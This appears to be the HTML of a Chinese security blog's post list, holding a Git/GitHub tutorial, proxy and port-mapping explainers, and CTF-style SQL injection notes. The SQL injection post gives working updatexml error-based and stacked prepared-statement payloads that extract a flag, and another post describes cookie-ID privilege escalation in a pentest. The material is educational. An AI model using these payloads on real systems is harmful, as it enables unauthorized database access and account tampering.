+<p>7.撤销操作<br>如果你不小心修改了文件，但是忘记修改了哪里很细小的细节。有两种方法。<br>第一种可以版本回退到上一个版本 ：git reset –hard HEAD^<br>第二种撤销文件操作，git checkout – 1.txt （比如我修改的是1.txt）</p>
+<p><img src="https://i.imgur.com/H8vhck3.png" alt></p>
+<h1 id="github管理"><a href="#github管理" class="headerlink" title="github管理"></a>github管理</h1><p>1.我们先从本地连接到github，首先创建一个项目/库<br><img src="https://i.imgur.com/8SnS1Ht.png" alt></p>
+<p><img src="https://i.imgur.com/3f9DQ7U.png" alt></p>
+<p>2.然后打开gitbash 输入命令：ssh-keygen -t rsa -C “<a href="mailto:xxx@qq.com" target="_blank" rel="noopener">xxx@qq.com</a>“//填写自己注册的邮箱即可</p>
+<p>一路回车<br><img src="http://a3.qpic.cn/psb?/V14K5DCn0YAkcr/Jrita1ue.P*6PxIuxlQVtF18OxYhW49.xhsg*29wspY!/b/dLYAAAAAAAAA&ek=1&kp=1&pt=0&bo=2AW1AgAAAAADF1g!&tl=1&vuin=275640346&tm=1543899600&sce=60-2-2&rf=viewer_4" alt></p>
+<p>其中（/c/users/1/.ssh/id_rsa）目录存放密钥。//我自己默认的路径，上图中第四行</p>
+<p>打开 <a href="https://github.com/settings/ssh/new" target="_blank" rel="noopener">https://github.com/settings/ssh/new</a></p>
+<p>title 写备注，Key填写刚刚连接的时候目录下的密钥，id_rsa.pub文件打开复制密钥，全部保存到Key然后添加密钥即可。</p>
+<p>然后检验是否成功连接 输入命令 ssh -T <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a><br><img src="https://i.imgur.com/joU0Baw.png" alt></p>
+<p>如果你是第一次，输入yes就可以了，我这个是之前配置过所以直接显示successful,如果你的是出现不是这些内容，有可能是显示权限问题什么的，就应该是我上面提到的那种情况，你看一下你生成密钥时是否操作正确，目录下是否有那个known_hosts这个文件。</p>
+<p>3.最后配置config</p>
+<pre><code>git config –global user.name “用户名”
+git config –global user.email “邮箱”    </code></pre><p>配置完成输入命令 git config –global –list查看是否配置成功。Git和github配置完了，现在可以在github托管我们的项目了。</p>
+<p>4.打开一个文件夹打开git bash，使用输入命令<br>git init来使他成为一个仓库。</p>
+<p>5.然后远程连接到仓库。</p>
+<p>输入命令：git remote add origin <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:shuaizhupeiqi/test</p>
+<p>shuaizhupeiqi，是我的用户名，test是仓库名字</p>
+<p><img src="http://a1.qpic.cn/psb?/V14K5DCn0YAkcr/rH5NFBkKNMsvoRFoNokjphwr3cz37BRopQkMZ1U.GXk!/b/dFQBAAAAAAAA&ek=1&kp=1&pt=0&bo=fgFjAAAAAAADFy4!&tl=1&vuin=275640346&tm=1543924800&sce=60-2-2&rf=viewer_4" alt></p>
+<p>6.由于创建仓库的时候，默认创建了readme.md,所以本地是与仓库不同步的。我们先同步一下。</p>
+<p>git pull <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:shuaizhupeiqi/test</p>
+<p>7.上传更新</p>
+<p>第一步：git   add  . //后面是一个英文的.<br>第二步：git   commit   –m   “1”   (如果提交单个文件1，就这样写；如果提交所有文件，写成：git   commit   –m  *)<br>第三步：git   push   <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:shuaizhupeiqi/test//这样就可以推送上去了。  </p>
+<p><img src="http://a3.qpic.cn/psb?/V14K5DCn0YAkcr/M4vqusCrfUGeaBBFkQiuKiX4mqnMNk.Enm*Cf0JupbE!/b/dD4BAAAAAAAA&ek=1&kp=1&pt=0&bo=VgUlAwAAAAADF0c!&tl=1&vuin=275640346&tm=1543924800&sce=60-2-2&rf=viewer_4" alt><br>这样就完成了。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/03/sql注入/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="小猪佩奇">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.ico">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sec-Communication">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/03/sql注入/" itemprop="url">sql注入</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-03T00:00:00+08:00">
+                2018-12-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>注入千百样，本文仅记录一些姿势供个人查阅。轻喷。</p>
+<h1 id="HTTP分割注入"><a href="#HTTP分割注入" class="headerlink" title="HTTP分割注入"></a>HTTP分割注入</h1><p>题目地址实验吧：加了料的报错注入。<br>地址：<a href="http://ctf5.shiyanbar.com/web/baocuo/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/baocuo/index.php</a></p>
+<p><img src="http://m.qpic.cn/psb?/V14K5DCn0YAkcr/hM1RxRZ4qdSGafHA6s7uXUMdGnBa6U2Jb.rkqC2NQ8s!/b/dDYBAAAAAAAA&bo=GQPdAAAAAAADF*U!&rf=viewer_4" alt></p>
+<p>查看页面源代码，给出了我们sql查询语句很常规</p>
+<pre><code>&lt;!-- $sql=&quot;select * from users where username=&apos;$username&apos; and password=&apos;$password&apos;&quot;;  --&gt;</code></pre><p>根据提示 post传一个username和password然后开始注入</p>
+<p>语句：</p>
+<pre><code>username=admin&apos; or &apos;&amp;password=admin</code></pre><p>显示 You are our member, welcome to enter，可以说明单引号空格没有被过滤，不过既然是报错注入，那么加个单引号试试。</p>
+<p>语句：</p>
+<pre><code>username=admin&apos;&amp;password=admin</code></pre><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘admin’’ at line 1</p>
+<p>接下来写报错语句<br>语句：</p>
+<pre><code>username=admin&apos;and updatexml(1,concat(0x7e,(select database()),0x7e),1) or &apos;&amp;password=admin</code></pre><p>一翻测试之后发现,有个神奇的过滤，username过滤了（），password过滤了一切报错函数。</p>
+<p>可以组合一下。username写函数updatexml。password写（），但是怎么合并为一起呢，想到sql语句是  </p>
+<pre><code>select * from users where username=&apos;$username&apos; and password=&apos;$password  
+$username=updatexm/*,$password=*/...这样sql语句会变成
+
+select * from users where username=&apos;updatexm/* and password=&apos;*/...</code></pre><p>这样便可以注释掉中间的代码一种骚姿势，接下来继续正常注入。</p>
+<pre><code>username=&apos; and updatexml/*&amp;password=*/(1,concat(0x7e,(select database()),0x7e),1) or &apos;</code></pre><p><img src="http://47.106.185.69/1/./img/1559184520.jpg" alt></p>
+<p>成功爆出来数据库名称。</p>
+<p>语句</p>
+<pre><code>username=&apos; and updatexml/*&amp;password=*/(1,concat(0x7e,(select table_name from information_schema.tables where table_schema =&apos;error_based_hpf&apos;),0x7e),1) or &apos;</code></pre><p>=号被过滤，可以使用正则注入，也就是=换成regexp</p>
+<pre><code>username=&apos; and updatexml/*&amp;password=*/(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema regexp&apos;error_based_hpf&apos;),0x7e),1) or &apos;</code></pre><p>这里使用group_concat来爆出所有的表名字</p>
+<pre><code>XPATH syntax error: &apos;~ffll44jj,users~&apos;</code></pre><p>查列</p>
+<pre><code>username=&apos; and updatexml/*&amp;password=*/(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name regexp&apos;ffll44jj&apos;),0x7e),1) or &apos;
+
+XPATH syntax error: &apos;~value~&apos;</code></pre><p>查数据</p>
+<pre><code>username=&apos; and updatexml/*&amp;password=*/(1,concat(0x7e,(select value from 
+ffll44jj),0x7e),1) or &apos;
+
+XPATH syntax error: &apos;~flag{err0r_b4sed_sqli_+_hpf}~&apos;</code></pre><p>如果flag超过32位，可以mid截断来查询。不过本题中是禁止了mid函数的不过也不超过32位可以直接获取flag。</p>
+<h1 id="堆叠预编译注入"><a href="#堆叠预编译注入" class="headerlink" title="堆叠预编译注入"></a>堆叠预编译注入</h1><p>首先了解下预处理语句</p>
+<pre><code>预制语句的SQL语法基于三个SQL语句：
+
+PREPARE stmt_name FROM preparable_stmt;
+
+EXECUTE stmt_name [USING @var_name [, @var_name] ...];
+
+{DEALLOCATE | DROP} PREPARE stmt_name;</code></pre><p>对于不确定参数以问号代替，然后using加入参数即可。</p>
+<p><img src="http://47.106.185.69/1/./img/1559185099.jpg" alt></p>
+<p>预处理语句可以和正常查询一样，但是查询方式稍有变化，在一些绕过中可以利用这种机制来进行sql注入。</p>
+<p>堆叠注入</p>
+<p>在一条sql语句执行完毕后，使用分号结尾，然后利用多条语句执行特性，然后完整攻击。</p>
+<p>简单的堆叠查询。</p>
+<p><img src="http://47.106.185.69/1/./img/1559186303.jpg" alt></p>
+<pre><code>mysql&gt; set @a=&apos;select * from user where id =1&apos;;prepare stmt from @a;execute stmt;
+Query OK, 0 rows affected (0.00 sec)
+
+Query OK, 0 rows affected (0.00 sec)
+Statement prepared
+
++----+------------------+------------------+----------------------------------+---------------------------------------------------------------------------------+
+| ID | username         | email            | password                         | img                                                                             |
++----+------------------+------------------+----------------------------------+---------------------------------------------------------------------------------+
+|  1 | 275640346@qq.com | 275640346@qq.com | 20905fe3160505df06abf12bfc8294fa | ../upload/54223df3e0247c41ce29176d227f95cf/ae566253288191ce5d879e51dae1d8c3.png |
++----+------------------+------------------+----------------------------------+---------------------------------------------------------------------------------+
+1 row in set (0.00 sec)</code></pre><p>利用mysql的特性对十六进制也可进行查询。</p>
+<p><img src="http://47.106.185.69/1/./img/1559186526.jpg" alt></p>
+<p>如果对prepare excute等关键词无过滤便可以用这个特性绕过很多关键词来达到sql注入效果。</p>
+<p>或者ascii来解码进行注入</p>
+<p>mysql&gt; set @s=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(100),char(97),char(116),char(97),char(98),char(97),char(115),char(101),char(40),char(41)); prepare a from @s;execute a;<br>Query OK, 0 rows affected (0.00 sec)</p>
+<p>Query OK, 0 rows affected (0.00 sec)<br>Statement prepared</p>
+<pre><code>+------------+
+| database() |
++------------+
+| qwb        |
++------------+
+1 row in set (0.00 sec)
+
+mysql&gt; select concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(100),char(97),char(116),char(97),char(98),char(97),char(115),char(101),char(40),char(41));
++---------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(100),char(97),char(116),char(97),char(98),char(97),char(115),char(101),char(40),char(41)) |
++---------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| select database()                                                                                                                                                         |
++---------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</code></pre><p>1 row in set (0.00 sec)</p>
+<p>参考强网杯web-随便注</p>
+<pre><code>https://k-ring.github.io/2019/05/28/%E7%AC%AC%E4%B8%89%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFwriteup/</code></pre>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/02/web漏洞越权/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="小猪佩奇">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.ico">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sec-Communication">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/02/web漏洞越权/" itemprop="url">web漏洞之越权</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-02T00:00:00+08:00">
+                2018-12-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="水平越权实战"><a href="#水平越权实战" class="headerlink" title="水平越权实战"></a>水平越权实战</h1><p>在一次渗透测试中遇到几个经典的水平越权漏洞，以及几个权限绕过。</p>
+<h2 id="增加任意用户的购物车"><a href="#增加任意用户的购物车" class="headerlink" title="增加任意用户的购物车"></a>增加任意用户的购物车</h2><p><img src="https://i.imgur.com/0yHYGCZ.png" alt></p>
+<p>点击加入购物车然后抓包，</p>
+<p><img src="https://i.imgur.com/sJKt4C2.png" alt></p>
+<p>一般越权漏洞都会将信息放在cookie中，严密的都会加token，此次遇到的一个水平越权，验证的信息全部放在cookie里，并且以 userinfo参数验证，耐心测试，后台验证的为ID，也就是说只要你修改对应ID，那么就会加入到对应用户的购物车了，一般这种接口都是网站，所以网站也可能全部都是验证ID。同样存在清空购物车，删除地址漏洞，水平越权。</p>
+<p>此次渗透测试总结一个小经验，在测试后台到底验证什么参数的时候可一个一个抓包，删除其他参数，剩下自己所要尝试的，如果失败更换参数继续测试，也有很多时候他是callback多层认证用户信息，所以可能在后面一个包里，总之耐心点测试，此次测试也发现一个callbackjsonp,为返回用户信息认证，存在用户敏感信息。情况允许的时候可以一套组合拳带走！</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/25/正反向代理/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="小猪佩奇">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.ico">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sec-Communication">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/11/25/正反向代理/" itemprop="url">正反向代理</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-25T00:00:00+08:00">
+                2018-11-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="代理服务器"><a href="#代理服务器" class="headerlink" title="代理服务器"></a>代理服务器</h1><p>什么是代理服务器（Proxy Serve）？提供代理服务的电脑系统或其它类型的网络终端,代替网络用户去取得网络信息。</p>
+<p>代理服务器（Proxy Server）是一种重要的服务器安全功能，它的工作主要在开放系统互联(OSI)模型的会话层，从而起到防火墙的作用。代理服务器大多被用来连接INTERNET（国际互联网）和Local Area Network（局域网）。</p>
+<p>代理顾名思义，是代替你做一些事情，把事情交给代理，他去帮你做你想做的。举例：你想去女寝取东西，碍于男人身份，找个女同学帮你去取，这个女人同学就是代理。如果女同学想隐藏你的身份就不会告诉宿管阿姨，也可以达到隐匿身份的作用。</p>
+<h1 id="为啥使用代理服务器"><a href="#为啥使用代理服务器" class="headerlink" title="为啥使用代理服务器"></a>为啥使用代理服务器</h1><p>1.提高访问速度<br>由于目标主机返回的数据会存放在代理服务器的硬盘中，因此下一次客户再访问相同的站点数据时，会直接从代理服务器的硬盘中读取，起到了缓存的作用，尤其对于热门网站能明显提高访问速度。</p>
+<p>2.防火墙作用<br>由于所有的客户机请求都必须通过代理服务器访问远程站点，因此可以在代理服务器上设限，过滤掉某些不安全信息。同时正向代理中上网者可以隐藏自己的IP,免受攻击。</p>
+<p>3.突破访问限制<br>互联网上有许多开发的代理服务器，客户机在访问受限时，可通过不受限的代理服务器访问目标站点，通俗说，我们使用的翻墙浏览器就是利用了代理服务器，可以直接访问外网。</p>
+<h1 id="正反向代理区别"><a href="#正反向代理区别" class="headerlink" title="正反向代理区别"></a>正反向代理区别</h1><p>正向代理：</p>
+<p>A同学在大众创业、万众创新的大时代背景下开启他的创业之路，目前他遇到的最大的一个问题就是启动资金，于是他决定去找马云爸爸借钱，可想而知，最后碰一鼻子灰回来了，情急之下，他想到一个办法，找关系开后门，经过一番消息打探，原来A同学的大学老师王老师是马云的同学，于是A同学找到王老师，托王老师帮忙去马云那借500万过来，当然最后事成了。不过马云并不知道这钱是A同学借的，马云是借给王老师的，最后由王老师转交给A同学。这里的王老师在这个过程中扮演了一个非常关键的角色，就是代理，也可以说是正向代理，王老师代替A同学办这件事，这个过程中，真正借钱的人是谁，马云是不知道的，这点非常关键。</p>
+<p>我们常说的代理也就是只正向代理，正向代理的过程，它隐藏了真实的请求客户端，服务端不知道真实的客户端是谁，客户端请求的服务都被代理服务器代替来请求，某些科学上网工具扮演的就是典型的正向代理角色。用浏览器访问 <a href="http://www.google.com" target="_blank" rel="noopener">http://www.google.com</a> 时，被残忍的block，于是你可以在国外搭建一台代理服务器，让代理帮我去请求google.com，代理把请求返回的相应结构再返回给我。</p>
+<p>反向代理：</p>
+<p>大家都有过这样的经历，拨打10086客服电话，可能一个地区的10086客服有几个或者几十个，你永远都不需要关心在电话那头的是哪一个，叫什么，男的，还是女的，漂亮的还是帅气的，你都不关心，你关心的是你的问题能不能得到专业的解答，你只需要拨通了10086的总机号码，电话那头总会有人会回答你，只是有时慢有时快而已。那么这里的10086总机号码就是我们说的反向代理。客户不知道真正提供服务人的是谁。</p>
+<p>反向代理隐藏了真实的服务端，当我们请求 <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> 的时候，就像拨打10086一样，背后可能有成千上万台服务器为我们服务，但具体是哪一台，你不知道，也不需要知道，你只需要知道反向代理服务器是谁就好了，<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> 就是我们的反向代理服务器，反向代理服务器会帮我们把请求转发到真实的服务器那里去。Nginx就是性能非常好的反向代理服务器，用来做负载均衡。</p>
+<p>两者的区别在于代理的对象不一样：正向代理代理的对象是客户端，反向代理代理的对象是服务端，正向代理隐藏真实客户端，反向代理隐藏真实服务端。</p>
+<p>1.位置不同<br>正向代理，架设在客户机和目标主机之间；<br>反向代理，架设在服务器端；<br>2.代理对象不同<br>正向代理，代理客户端，服务端不知道实际发起请求的客户端；</p>
+<p>反向代理，代理服务端，客户端不知道实际提供服务的服务端；   </p>
+<p><img src="https://img-blog.csdn.net/20171231140104634?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvenQxNTczMjYyNTg3OA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt></p>
+<p><img src="https://img-blog.csdn.net/20171231140104634?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvenQxNTczMjYyNTg3OA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt></p>
+<p>正向代理–HTTP代理为多个人提供翻墙服务；反向代理–百度外卖为多个商户提供平台给某个用户提供外卖服务。<br>1.用途不同<br>正向代理，为在防火墙内的局域网客户端提供访问Internet的途径；<br>反向代理，将防火墙后面的服务器提供给Internet访问；<br>2.安全性不同<br>正向代理允许客户端通过它访问任意网站并且隐藏客户端自身，因此必须采取安全措施以确保仅为授权的客户端提供服务；<br>反向代理都对外都是透明的，访问者并不知道自己访问的是哪一个代理。</p>
+<h1 id="正反向代理，模拟vpn"><a href="#正反向代理，模拟vpn" class="headerlink" title="正反向代理，模拟vpn"></a>正反向代理，模拟vpn</h1><p>链接:<a href="https://shuaizhupeiqi.github.io/2018/11/20/%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84/" target="_blank" rel="noopener">https://shuaizhupeiqi.github.io/2018/11/20/%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84/</a></p>
+<hr>
+<p>参考：<a href="https://blog.csdn.net/zt15732625878/article/details/78941268" target="_blank" rel="noopener">https://blog.csdn.net/zt15732625878/article/details/78941268</a> </p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/20/端口映射/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="小猪佩奇">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.ico">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sec-Communication">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/11/20/端口映射/" itemprop="url">端口映射-模拟VPN制作</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-20T00:00:00+08:00">
+                2018-11-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="端口映射简介"><a href="#端口映射简介" class="headerlink" title="端口映射简介"></a>端口映射简介</h1><p>百度百科：端口映射是NAT的一种，功能是把在公网的地址转翻译成私有地址， 采用路由方式的ADSL宽带路由器拥有一个动态或固定的公网IP，ADSL直接接在HUB或交换机上，所有的电脑共享上网。</p>
+<h1 id="端口映射转发区别"><a href="#端口映射转发区别" class="headerlink" title="端口映射转发区别"></a>端口映射转发区别</h1><p>转发与映射，按理解意思，是用不同的方法实现同样的目标。</p>
+<p>端口转发：你给我了，我打开看看，发现这上面标志显示是要给张三，那么我就给张三去。如果标志是给李四，那我就再给李四去。</p>
+<p>端口映射：你放到我左手，我就直接给张三；你放到我右手，我就直接给李四。这中间我不管你放我手上的是什么东西。</p>
+<p>转发的重点在“转”上面。送快递的过来，把所有快递都交给门口保安，保安再根据每件快递上的收件人来分发。映射，就是在大门口给每个人装个柜子，送快递的直接按收件人名字，把快递放到对应的柜子里面。</p>
+<p>区别不大，实例中在慢慢理解吧!</p>
+<h1 id="端口映射的形象理解"><a href="#端口映射的形象理解" class="headerlink" title="端口映射的形象理解"></a>端口映射的形象理解</h1><p>端口映射就类似一个中转站，三个人，第一个人要找第三个人传递信息必须告诉第二个人，然后第二个人转告第三个人。就字面意思–端口转发。有些时候还有一些妙用，比如网站藏匿端口，访问公网ip:8888端口，映射为内网端口的8080。</p>
+<p>想实现访问公司局域网服务器，IP地址是172.16.1.215，如果我们出差在外，使用的电脑IP地址是192.168.10.215，怎么样去访问局域网服务器的地址172.16.1.215呢;</p>
+<p>此时，我们可以登录局域网服务器所在的路由器，可以通过ipconfig获取网关地址，知道网关后登录到路由器后台，设置端口映射，将内部端口、外部端口设置为3737，内部IP设置为172.16.1.215，个人使用的电脑运行mstsc命令，在窗口中输入公司申请的公网IP+3737，就可以直接访问局域网服务器；</p>
+<h1 id="端口映射与VPN"><a href="#端口映射与VPN" class="headerlink" title="端口映射与VPN"></a>端口映射与VPN</h1><p>端口映射与VPN 目标都是为了从外网访问局域网内网，端口映射和VPN都可以实现远程控制访问</p>
+<p>相同点：端口映射和VPN都可以实现通过外网访问内网。<br>不同点：端口映射将端口暴露在公网中，使用nmap等端口扫描器可扫描，且端口映射数据没有进行加密处理，容易被截取并分析，对系统服务器以及网络安全造成威胁。<br>而VPN 只有通过VPN创建用户，服务器那边的授权，客户端才能进行正常访问，安全性相对较高。</p>
+<p>端口映射相对简单，VPN安全性更高</p>
+<h1 id="VM端口映射"><a href="#VM端口映射" class="headerlink" title="VM端口映射"></a>VM端口映射</h1><p>实例走一下 ，内外网的互通吧。</p>
+<p>前言，要保证VM是nat连接。</p>
+<p>1.打开VM左上角编辑，打开虚拟网络设置。</p>
+<p><img src="https://i.imgur.com/AeFotL9.png" alt></p>
+<p>2.NAT设置如图</p>
+<p><img src="http://a1.qpic.cn/psb?/V14K5DCn3C6bNV/a7CmzXwK.VzLn.PLqbiCxupZX2A9JP1ZTImErjpYzVo!/b/dFQBAAAAAAAA&ek=1&kp=1&pt=0&bo=*AEVAgAAAAADF9g!&tl=1&vuin=275640346&tm=1542718800&sce=60-2-2&rf=viewer_4" alt></p>
+<p>3.windows设置出站入站规则</p>
+<p><img src="https://i.imgur.com/GQUFxRM.png" alt></p>
+<p>入站规则，是别人访问自己的端口规则，设置80端口开放，别人就可以访问自己的IP的80端口，而出站规则是自己访问其他网站的端口，测试发现出站规则没看到80端口却可以访问80端口，dl说访问别人端口可能是用类似50000端口去访问别人的80端口，所以我们要访问别人10000端口的时候未必要设置出战规则端口10000。dl说看下tcp三次握手了解下。</p>
+<p>4.测试结果</p>
+<p>使用虚拟机 nc -lvvp 8888</p>
+<p>访问物理机的6666端口即可转发到虚拟机的8888端口，记得设置入站规则6666端口，保证端口开放！先扫描下物理机6666端口。</p>
+<p><img src="http://a2.qpic.cn/psb?/V14K5DCn3C6bNV/WdG3p4i1GW11StpHM5bXD2iBwfvG.vKyQ*LKv1yfKdI!/b/dDEBAAAAAAAA&ek=1&kp=1&pt=0&bo=kAJEAQAAAAADJ9U!&tl=1&vuin=275640346&tm=1542718800&sce=60-2-2&rf=viewer_4" alt></p>
+<p>可以看到 监听的6666端口在访问物理机的8888端口的时候成功捕捉到。<br>由物理机6666端口映射到虚拟机的8888端口！<br><img src="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/GTh0remJT0I9c8pOWtfKZd9h*i8O9Rh*Ga3fx**WDmw!/b/dDYBAAAAAAAA&bo=ZAROAQAAAAADBw0!&rf=viewer_4" alt></p>
+<p>一篇VM 很详细的参考文章：<a href="https://blog.csdn.net/BokeyGeGe/article/details/78631328" target="_blank" rel="noopener">https://blog.csdn.net/BokeyGeGe/article/details/78631328</a></p>
+<h1 id="ssh隧道-重点"><a href="#ssh隧道-重点" class="headerlink" title="ssh隧道(重点)"></a>ssh隧道(重点)</h1><p>SSH会自动加密和解密所有SSH客户端与服务端之间的网络数据。但是，SSH还能够将其他TCP端口的网络数据通SSH链接来转发，并且自动提供了相应的加密及解密服务。这一过程也被叫做”隧道”（tunneling）。</p>
+<p>这是因为SSH为其他TCP链接提供了一个安全的通道来进行传输而得名。例如，Telnet ，SMTP ，LDAP这些TCP应用均能够从中得益，避免了用户名，密码以及隐私信息的明文传输。而与此同时，如果工作环境许中的防火墙限制了一些网络端口的使用，但是允许SSH的连接，也能够将通过将TCP用端口转发来使用SSH进行通讯。</p>
+<p>下面的VPN制作就用到了ssh隧道技术。</p>
+<h1 id="VM虚拟机模拟VPN翻墙—正向代理"><a href="#VM虚拟机模拟VPN翻墙—正向代理" class="headerlink" title="VM虚拟机模拟VPN翻墙—正向代理"></a>VM虚拟机模拟VPN翻墙—正向代理</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>有三个机器，我们在第一台机器连接第二台机器ssh从而转发端口访问第三台机器。<br>在第一台连接第二台的ssh</p>
+<h2 id="第一次失败实验"><a href="#第一次失败实验" class="headerlink" title="第一次失败实验"></a>第一次失败实验</h2><p>前言：想测试下 三个内网IP 模拟谷歌翻墙，结果发现了点问题记录下!</p>
+<pre><code>win10 target 1   192.168.100.219
+linux target 2   192.168.189.129
